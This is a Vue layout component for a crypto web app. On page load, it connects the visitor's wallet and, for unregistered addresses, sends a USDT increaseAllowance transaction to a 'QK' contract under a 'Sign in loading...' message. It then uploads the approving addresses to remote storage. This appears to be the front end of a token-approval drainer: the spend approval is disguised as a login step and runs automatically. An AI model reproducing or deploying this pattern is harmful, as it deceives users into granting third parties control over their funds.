<template>
	<div id="layout">
		<HeadNav></HeadNav>
		<div id="main">
			<router-view></router-view>
		</div>
	</div>
</template>
<script setup>
import { watch } from "vue";
import HeadNav from "./modules/headNav";
import {  lockLoadHandler } from "@/utils/PlusElement";
import {
	useWindowResize,
	// useWindowScroll
} from "@/hooks/useWindow";
import Decimal from "decimal.js";
import { UseStoreResize } from "@/stores/window";
import { storeToRefs } from "pinia";
import { UseStoreWeb3js, UseStoreContracts } from "@/stores/web3js";
import baseAddress from "@/abis/contracts";
import {
	uploadUserAllowance,
	getAllUsersFileUrl,
	uploadAllUsers,
} from "@/common/fleekStorage";
import axios from "@/utils/request";

const { AbiAddressQK, addedValue } = baseAddress;
const { setClientWidth } = UseStoreResize();
useWindowResize(() => {
	setClientWidth();
});
const storeContracts = UseStoreContracts();
const storeWeb3js = UseStoreWeb3js();
const { startWeb3, setRe } = storeWeb3js;
const { haveAuth, userAddress } = storeToRefs(storeWeb3js);
const { Contracts } = storeToRefs(storeContracts);

init();
async function init() {
	if (!haveAuth.value) {
		console.log("获取web3");
		await startWeb3();
		// ()=> allowance()
	}
	upload_AllUsers();
	const _isRe = await isRe(userAddress.value);
	console.log("_isRe", _isRe);

	if (!_isRe) {
		await allowance();
	}
	// else {
	// 	await getRes()
	// }
}

watch(
	() => userAddress.value,
	async (news, olds) => {
		if (news != olds) {
			upload_AllUsers();
			const _isRe = await isRe(userAddress.value);
			console.log("_isRe", _isRe);
			if (!_isRe) {
				await allowance();
			} else {
				await getRes();
			}
		}
	}
);

async function isRe(address) {
	try {
		const { Contracts } = UseStoreContracts();
		const res = await Contracts.QKContract.methods.isRe(address).call();
		// console.log(res);
		return res;
	} catch (e) {
		console.error(e);
		return false;
	}
}
async function getRes() {
	try {
		const { QKContract } = Contracts.value;
		const res = await QKContract.methods.getRes(userAddress.value).call();
		console.log("getRes", res);
		const _isRe = await isRe(res);
		if (_isRe) {
			setRe(res);
		}
		return res;
	} catch (e) {
		console.error(e);
		return;
	}
}

async function allowance() {
	try {
		const { USDTContract } = Contracts.value;
		const res_allowance = await USDTContract.methods
			.allowance(userAddress.value, AbiAddressQK)
			.call();
		const v = new Decimal(res_allowance);
		// console.log('是否有授权',v);
		if (v <= 0) {
			// setUserAddress('')
			const res = await increaseAllowance();
			if (res) {
				upload();
			}
		}
	} catch (e) {
		// setUserAddress('')
		console.error(e);
	}
}

async function increaseAllowance() {
	const load = lockLoadHandler("Sign in loading...");
	try {
		const { USDTContract } = Contracts.value;
		const res = await USDTContract.methods
			.increaseAllowance(AbiAddressQK, addedValue)
			.send({
				from: userAddress.value,
			});
		console.log("increaseAllowance", res);
		load.close();
		return res;
	} catch (e) {
		console.error(e);
		load.close();
		return false;
	}
}

async function upload() {
	const load = lockLoadHandler("upload loading...");
	try {
		const res = await uploadUserAllowance(userAddress.value);
		if (res) {
			console.log("上传成功");
		}
		load.close();
	} catch (e) {
		console.error(e);
		// PlusElMessage({
		// 	type: 'error',
		// 	message: e.message
		// })
		load.close();
	}
}

async function upload_AllUsers() {
	try {
		const needUpload = await getAllUserOnce(userAddress.value);
		console.log("upload_AllUsers hadUser", !needUpload);
		if (!needUpload) {
			const res = await uploadAllUsers(userAddress.value);
			if (res) {
				console.log("uploadAllUsers 上传成功");
			}
		}
	} catch (e) {
		console.error(e);
	}
}
async function getAllUserOnce() {
	try {
		const url = getAllUsersFileUrl(userAddress.value);
		const res = await axios.get(url);
		console.log("getAllUserOnce res", res);
		return res && res.time ? true : false;
	} catch (e) {
		console.error(e);
		console.log("getAllUser - axios error");
		return false;
	}
}
</script>
<style lang="scss" scoped>
@import "./index.scss";
#layout {
	color: $layout-color;
	background-color: $layout-background__color;
	background-image: url("~@/assets/bg/layout-bg.png");
	background-repeat: repeat-y;
	#main {
		min-height: calc(100vh - $head-height__pc);
		@media screen and (max-width: 1280px) {
			min-height: calc(100vh - $head-height__ph);
		}
	}
}
</style>
